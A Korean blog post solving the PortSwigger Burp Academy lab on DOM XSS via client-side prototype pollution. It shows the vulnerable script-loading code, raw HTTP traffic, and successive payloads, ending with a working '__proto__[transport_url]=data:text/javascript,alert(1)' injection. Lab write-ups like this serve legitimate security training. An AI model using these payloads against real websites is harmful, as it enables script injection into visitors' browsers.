---
layout: post
title: "Burp Academy-Prototype Pollution 첫번째 문제:DOM XSS via client-side prototype pollution"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, Prototype Pollution]
toc: true
---

# 개요
- 프로토타입 폴루션(Prototype Pollution, 프로토타입 오염) 취약점에 대한 문제이다. 
- 문제 주소: https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution
- 프로토타입 폴루션 설명 주소: https://portswigger.net/web-security/prototype-pollutionwhat-is-prototype-pollution
- 난이도: PRACTITIONER (중간)


# 문제 분석

```
This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:

1. Find a source that you can use to add arbitrary properties to the global Object.prototype.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call alert().

You can solve this lab manually in your browser, or use DOM Invader to help you.
```

- 프로토타입 폴루션이 가능한 곳을 찾는다. 
- 페이로드를 만들어서 자바스크립트 alert 함수가 실행되도록 만든다. 
- 브라우저를 통해서 풀어도되고  `Dom Invader` 를 사용하면 더 쉬울 수도 있다. 




# 풀이
## 가능한 곳 찾기

![상품 검색](/images/burp-academy-prototype-pollution-1-2.png)

- 검색어를 입력하고 "Search" 버튼을 클릭하면 GET 요청이 발생하고 URL로 파라메터가 전달된다. 

```http
GET /?search=aaaa HTTP/1.1
Host: 0a5300b3032c5f25c2643a44000000f1.web-security-academy.net
Cookie: session=BRR4p1oZFSX1e1MEJ8r7OkjZb4KVjCFB
Sec-Ch-Ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7
Connection: close

```

그리고 다음과 같이 평범해보이는 200 응답이 회신된다. 
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 3209

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <title>DOM XSS via client-side prototype pollution</title>
    </head>
    <body>
(이하생략)
```

그리고 이 페이지를 크롬 디버거로 살펴보면 응답을 받으면 `searchLogger.js` 파일의 다음 자바스크립트가 실행되도록 되어 있다. 페이지의 `load` 이벤트에 반응하도록 되어 있어 페이지 로드가 완료되면 `searchLogger` 함수가 이어서 실행된다. 코드를 조금 분석해본다. 

- `searchLogger` 함수에서는 `deparam.js` 에 정의되어 있는 deparam 오브젝트를 생성하고 `config` 라는 변수에 저장해둔다. 
- `config` 변수에 `transport_url` 라는 속성(property)이 있다면 동적으로 script 태그를 만들고 이 태그의 `src` 속성을 `transport_url` 의 값으로 설정한다. 
- 아마도 `transport_url` 을 XSS가 가능한 페이로드로 지정하면 문제가 풀리지 않을까 한다. 

```javascript 
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }

    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

window.addEventListener("load", searchLogger);
```
그리고 `deparam.js` 의 코드는 대략 다음과 같다. 실제로 프로토타입 폴루션 취약점이 있는 부분이 코드 같다. URL에 지정된 파라메터의 값을 자바스크립트의 오브젝트에 무조건적으로 설정해주는 부분같다. (`__proto__` 와 같은 위험한 key가 사용되고 있는지를 체크해주는 부분이 없다.  )

![deparam.js](/images/burp-academy-prototype-pollution-1-1.png)


## 1차 시도
[XXS 페이로드 리스트](https://github.com/payloadbox/xss-payload-list){:target="_blank"} 를 보면, `<script src="javascript:alert(1)">` 페이로드가 있다. 이 것을 사용해보자. 


`?search=eeess&__proto__[transport_url]=javascript:alert(1)` 페이로드를 지정하면 script.src 의 값이 alert(1) 테스트해보았다. 

결과는 실패. alert 창이 나타나지 않았다. 흠...

크롬 디버거로 브레이크포인트를 찍어서 값을 확인해본다. params 오브젝트의 프로토타입의 속성 transport_url에 값이 지정된 것을 확인했다. 이 것으로 일단 프로토타입 폴루션자체를 성공한 것을 알 수 있다. __proto__ 키를 이용해서 오브젝트의 특정 키에 값을 주입했다. 

![프로톹타입 폴루션 확인](/images/burp-academy-prototype-pollution-1-3.png)

그런데 최종결과를 보면 다음과 같은 에러를 확인할 수 있었다. 

![UNKNOWN_URL_SCHEME 에러](/images/burp-academy-prototype-pollution-1-4.png)

## 2차 시도 
페이로드에서 `javscript` 를 없애고 다음과 같이 만들었다. `?search=eeess&__proto__[transport_url]=alert(1)` 실행해보니 이번에는 404 응답 에러가 발생했다. 

그리고 이 떄 Burp Proxy 이력을 보니 다음과 같은 통신이 발생한 것을 확인했다. `<script src="alert(1)">` 이 삽입되니, `GET /alert(1)` 요청이 실행된 것이다. src에 바로 alert 코드를 쓰는 것은 답이 아닌 것 같다. 다른 페이로드를 찾아본다. 

```http
GET /alert(1) HTTP/1.1
Host: 0a1800e104c74374c2bf71be00a4002b.web-security-academy.net
Cookie: session=9YMbSxCjJHulZ7ZPfUBnGvoiWivMSkpj
Sec-Ch-Ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://0a1800e104c74374c2bf71be00a4002b.web-security-academy.net/?search=eeess&__proto__[transport_url]=alert(1)
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7
Connection: close
```

```
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 11

"Not Found"
```

## 3차 시도 
[XXS 페이로드 리스트](https://github.com/payloadbox/xss-payload-list){:target="_blank"} 에서 `<script src="data:text/javascript,alert(1)"></script>` 페이로드를 발견했다. 왠지 이 것을 쓰면 HTTP 통신이 발생하지 않고 script가 실행될 것 같은 예감이 든다. 테스트해본다. 

삽입된 페이로드를 브레이크 포인트로 확인해본다. `data:text/javascript,alert(1)` 이 삽입된 것을 확인했다. 브레이크 포인트를 중지하고 계속 진행시킨다. 

![삽입된 페이로드 확인](/images/burp-academy-prototype-pollution-1-5.png)

자바스크립트 실행에 성공했다! 
![UNKNOWN_URL_SCHEME 에러](/images/burp-academy-prototype-pollution-1-6.png)

OK버튼을 누르면 축하한다는 메세지가 나온다. 
![UNKNOWN_URL_SCHEME 에러](/images/burp-academy-prototype-pollution-1-7.png)